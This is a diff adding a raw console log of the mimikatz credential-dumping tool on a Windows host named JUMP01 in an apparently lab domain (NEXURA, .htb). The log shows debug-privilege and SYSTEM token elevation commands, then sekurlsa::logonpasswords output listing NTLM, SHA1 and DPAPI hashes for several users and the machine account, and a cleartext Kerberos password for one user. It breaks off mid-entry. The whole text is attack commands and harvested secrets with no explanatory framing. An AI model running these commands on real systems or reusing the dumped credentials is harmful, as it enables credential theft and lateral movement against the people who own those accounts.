@@ -1,0 +1,590 @@
+c:\Tools>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+552     {0;000003e7} 1 D 34207          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;002d526a} 4 F 4229593     NEXURA\bdavid   S-1-5-21-1333759777-277832620-2286231135-1105   (15g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 4319587     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 2970218 (00000000:002d526a)
+Session           : RemoteInteractive from 4
+User Name         : bdavid
+Domain            : NEXURA
+Logon Server      : DC01
+Logon Time        : 4/19/2026 8:23:41 PM
+SID               : S-1-5-21-1333759777-277832620-2286231135-1105
+        msv :
+         [00000003] Primary
+         * Username : bdavid
+         * Domain   : NEXURA
+         * NTLM     : 82c5ef7f2612567964070d04fe46a5d0
+         * SHA1     : 71a8aa8444011bd599841eb1760ae0240e5451e1
+         * DPAPI    : f72c50843831ce99704c8c3ce013dfe3
+        tspkg :
+        wdigest :
+         * Username : bdavid
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : bdavid
+         * Domain   : NEXURA.HTB
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 2961289 (00000000:002d2f89)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/19/2026 8:23:40 PM
+SID               : S-1-5-90-0-4
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 2960566 (00000000:002d2cb6)
+Session           : Interactive from 4
+User Name         : UMFD-4
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/19/2026 8:23:40 PM
+SID               : S-1-5-96-0-4
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1770190 (00000000:001b02ce)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/19/2026 7:37:53 PM
+SID               : S-1-5-96-0-3
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 258228 (00000000:0003f0b4)
+Session           : RemoteInteractive from 2
+User Name         : stom
+Domain            : NEXURA
+Logon Server      : DC01
+Logon Time        : 4/19/2026 6:45:24 PM
+SID               : S-1-5-21-1333759777-277832620-2286231135-1106
+        msv :
+         [00000003] Primary
+         * Username : stom
+         * Domain   : NEXURA
+         * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
+         * SHA1     : f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+         * DPAPI    : 06e85cb199e902a0145ff04963e7dd72
+        tspkg :
+        wdigest :
+         * Username : stom
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : stom
+         * Domain   : NEXURA.HTB
+         * Password : calves-warp-learning1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 238646 (00000000:0003a436)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:45:24 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 7bef0ee0b472d2c5805921324525f321
+         * SHA1     : 6158a1877c4157ed624eb5c4d717e237525bbef1
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : 33 3f 47 87 88 ef 02 f9 db 68 be 04 ae 0c 7a 44 7a 3e 65 34 e6 e0 12 cc 1e dc 04 49 7e c6 60 14 63 0d bc aa 97 21 d6 a6 21 7b 00 03 28 90 d9 8d 52 dc 22 2a 4b bc 66 1f d5 b7 1f fc f3 83 a1 af 87 07 24 76 9b 22 80 0f 0f 03 a4 02 a9 b5 37 9c 24 16 6f 63 ac 32 b9 33 81 1e 57 e0 29 92 10 67 d8 1b cc 65 81 b7 ed 92 4d 66 bd 4c d6 37 1a 8b 55 ab d5 71 97 9c d5 00 b2 3c b8 3d 76 d5 e2 42 41 e9 53 87 2e e6 9b f0 17 2f 57 e8 58 58 d1 f4 66 26 50 1e 6f ac 76 ef 4c f7 1e 16 35 c2 81 24 a5 f6 ac 2f 70 2a 68 e1 78 36 ab 52 d7 0d 47 f3 d4 dc 30 08 c6 fc 76 46 c0 08 12 8f 66 bd 3b 6e 71 79 33 30 20 39 84 5f ee c4 67 7a dd 12 b6 ed ad d9 35 ea 40 6d 05 1e 0e 49 f1 8c 83 e9 60 0b 24 d6 8c 7d e3 03 99 35 7c 10 91 8b 7b 3c 47 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 223033 (00000000:00036739)
+Session           : Batch from 0
+User Name         : stom
+Domain            : NEXURA
+Logon Server      : DC01
+Logon Time        : 4/19/2026 6:45:23 PM
+SID               : S-1-5-21-1333759777-277832620-2286231135-1106
+        msv :
+         [00000003] Primary
+         * Username : stom
+         * Domain   : NEXURA
+         * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
+         * SHA1     : f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+         * DPAPI    : 06e85cb199e902a0145ff04963e7dd72
+        tspkg :
+        wdigest :
+         * Username : stom
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : stom
+         * Domain   : NEXURA.HTB
+         * Password : calves-warp-learning1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : JUMP01$
+Domain            : NEXURA
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:44:51 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : jump01$
+         * Domain   : NEXURA.HTB
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 39754 (00000000:00009b4a)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:44:51 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 2970287 (00000000:002d52af)
+Session           : RemoteInteractive from 4
+User Name         : bdavid
+Domain            : NEXURA
+Logon Server      : DC01
+Logon Time        : 4/19/2026 8:23:41 PM
+SID               : S-1-5-21-1333759777-277832620-2286231135-1105
+        msv :
+         [00000003] Primary
+         * Username : bdavid
+         * Domain   : NEXURA
+         * NTLM     : 82c5ef7f2612567964070d04fe46a5d0
+         * SHA1     : 71a8aa8444011bd599841eb1760ae0240e5451e1
+         * DPAPI    : f72c50843831ce99704c8c3ce013dfe3
+        tspkg :
+        wdigest :
+         * Username : bdavid
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : bdavid
+         * Domain   : NEXURA.HTB
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 2961447 (00000000:002d3027)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/19/2026 8:23:40 PM
+SID               : S-1-5-90-0-4
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1779570 (00000000:001b2772)
+Session           : RemoteInteractive from 3
+User Name         : hwilliam
+Domain            : NEXURA
+Logon Server      : DC01
+Logon Time        : 4/19/2026 7:37:53 PM
+SID               : S-1-5-21-1333759777-277832620-2286231135-1107
+        msv :
+         [00000003] Primary
+         * Username : hwilliam
+         * Domain   : NEXURA
+         * NTLM     : f3ac86b290a51fb59a1a66f50b658e1f
+         * SHA1     : 0f0bb9f660fcada8a11e033f4acaba020b7b946e
+         * DPAPI    : 366e78bda1c8c5aad1fe56200a261b54
+        tspkg :
+        wdigest :
+         * Username : hwilliam
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : hwilliam
+         * Domain   : NEXURA.HTB
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1771133 (00000000:001b067d)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/19/2026 7:37:53 PM
+SID               : S-1-5-90-0-3
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1770822 (00000000:001b0546)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/19/2026 7:37:53 PM
+SID               : S-1-5-90-0-3
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 258209 (00000000:0003f0a1)
+Session           : RemoteInteractive from 2
+User Name         : stom
+Domain            : NEXURA
+Logon Server      : DC01
+Logon Time        : 4/19/2026 6:45:24 PM
+SID               : S-1-5-21-1333759777-277832620-2286231135-1106
+        msv :
+         [00000003] Primary
+         * Username : stom
+         * Domain   : NEXURA
+         * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
+         * SHA1     : f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+         * DPAPI    : 06e85cb199e902a0145ff04963e7dd72
+        tspkg :
+        wdigest :
+         * Username : stom
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : stom
+         * Domain   : NEXURA.HTB
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 238129 (00000000:0003a231)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:45:24 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 237344 (00000000:00039f20)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:45:24 PM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : d7 9f 44 db 12 9f ab 43 69 44 98 db 07 7d cd f3 13 1b 1b b4 30 45 91 04 d6 27 c4 c1 a6 4f 30 74 c4 ab e4 ff c8 b0 a8 79 9e 7f a9 31 99 a5 9a 81 23 de 43 49 8d 27 46 92 8e e0 63 8c e8 53 bc a3 d5 d3 cf 46 58 c5 2b 80 00 08 dc 36 8b ed 73 7d 75 e9 7f 3f a7 1f 1c b8 44 6e b4 17 d9 12 5b 4f 20 62 79 7d b4 e0 08 78 7f 51 6f 6d 94 b7 9d bb 29 49 41 8b f5 90 f0 f9 3f 30 63 2d 92 09 b2 dc ff 4d 84 5a ec 1d 45 be fc eb c0 93 a7 aa 84 06 dc e3 58 b2 0a 78 ce 37 48 a0 89 aa ba 9b 0e f4 58 1d 1e e1 45 9b 69 cb 12 7e 72 77 80 d6 3d 3e b2 be 55 d5 a6 d1 09 c3 ff 86 1b b3 87 d4 60 58 52 8d 70 dc 48 ef 97 5f 81 56 a0 90 e4 b3 7c dc c7 90 68 06 21 e9 c7 fb 90 50 59 fc eb 0e 45 45 0f 0b 15 d6 6b 2d 11 26 e6 0f d4 d3 1f 9b 7a 0f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:44:52 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 69339 (00000000:00010edb)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:44:51 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 7bef0ee0b472d2c5805921324525f321
+         * SHA1     : 6158a1877c4157ed624eb5c4d717e237525bbef1
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
+         * Password : 33 3f 47 87 88 ef 02 f9 db 68 be 04 ae 0c 7a 44 7a 3e 65 34 e6 e0 12 cc 1e dc 04 49 7e c6 60 14 63 0d bc aa 97 21 d6 a6 21 7b 00 03 28 90 d9 8d 52 dc 22 2a 4b bc 66 1f d5 b7 1f fc f3 83 a1 af 87 07 24 76 9b 22 80 0f 0f 03 a4 02 a9 b5 37 9c 24 16 6f 63 ac 32 b9 33 81 1e 57 e0 29 92 10 67 d8 1b cc 65 81 b7 ed 92 4d 66 bd 4c d6 37 1a 8b 55 ab d5 71 97 9c d5 00 b2 3c b8 3d 76 d5 e2 42 41 e9 53 87 2e e6 9b f0 17 2f 57 e8 58 58 d1 f4 66 26 50 1e 6f ac 76 ef 4c f7 1e 16 35 c2 81 24 a5 f6 ac 2f 70 2a 68 e1 78 36 ab 52 d7 0d 47 f3 d4 dc 30 08 c6 fc 76 46 c0 08 12 8f 66 bd 3b 6e 71 79 33 30 20 39 84 5f ee c4 67 7a dd 12 b6 ed ad d9 35 ea 40 6d 05 1e 0e 49 f1 8c 83 e9 60 0b 24 d6 8c 7d e3 03 99 35 7c 10 91 8b 7b 3c 47 56
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 69307 (00000000:00010ebb)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/19/2026 6:44:51 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * NTLM     : 47b03bb57dee903b136f1e60605a4b2c
+         * SHA1     : dcdb18e76f120f0683b267fcc2b6b9d6c759798c
+        tspkg :
+        wdigest :
+         * Username : JUMP01$
+         * Domain   : NEXURA
+         * Password : (null)
+        kerberos :
+         * Username : JUMP01$
+         * Domain   : nexura.htb
